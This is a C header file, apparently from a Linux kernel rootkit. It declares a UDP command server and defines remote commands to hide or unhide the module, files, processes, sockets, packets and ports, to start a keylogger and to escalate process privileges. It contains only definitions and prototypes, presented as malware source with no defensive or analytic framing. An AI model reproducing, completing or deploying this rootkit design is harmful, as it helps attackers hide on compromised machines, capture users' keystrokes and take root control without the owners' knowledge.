#ifndef UDPSERVER_H
#define UDPSERVER_H

#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/netdevice.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/timer.h>

/* commands */
#define CMD_HIDE_MODULE "hidemod"
#define CMD_SHOW_MODULE "showmod"
#define CMD_UNLOAD_MODULE "unloadmod"

#define CMD_HIDE_FILE "hidefile"
#define CMD_SHOW_FILE "showfile"

#define CMD_HIDE_PROCESS "hideproc"
#define CMD_SHOW_PROCESS "showproc"
#define CMD_POP_PROCESS "popproc"

#define CMD_HIDE_SOCKET "hidesocket"
#define CMD_SHOW_SOCKET "showsocket"

#define CMD_HIDE_PACKET "hidepacket"
#define CMD_SHOW_PACKET "showpacket"

#define CMD_HIDE_PORT "hideport"
#define CMD_SHOW_PORT "showport"

#define CMD_INIT_KEYLOGGER "keylog"
#define CMD_EXIT_KEYLOGGER "keyunlog"

#define CMD_PROC_ESCALATE "escalate"
#define CMD_PROC_DEESCALATE "deescalate"

/* not included in this kernel module
#define CMD_HC_DISABLE_READ_PAGE "hc-disable-read"
#define CMD_HC_ENABLE_READ_PAGE "hc-enable-read"
#define CMD_HC_DISABLE_WRITE_PAGE "hc-disable-write"
#define CMD_HC_ENABLE_WRITE_PAGE "hc-enable-write"
#define CMD_HC_DISABLE_RW_PAGE "hc-disable-rw"
#define CMD_HC_ENABLE_RW_PAGE "hc-enable-rw"
*/

/* struct for our kthread */
struct kthread_t {
	struct task_struct *thread;
	struct socket *sock;
	struct sockaddr_in addr;
	int running;
};

int udp_server_send(struct socket *sock, struct sockaddr_in *addr, 
	unsigned char *buf, int len);

int udp_server_start(void);
void udp_server_close(void);

#endif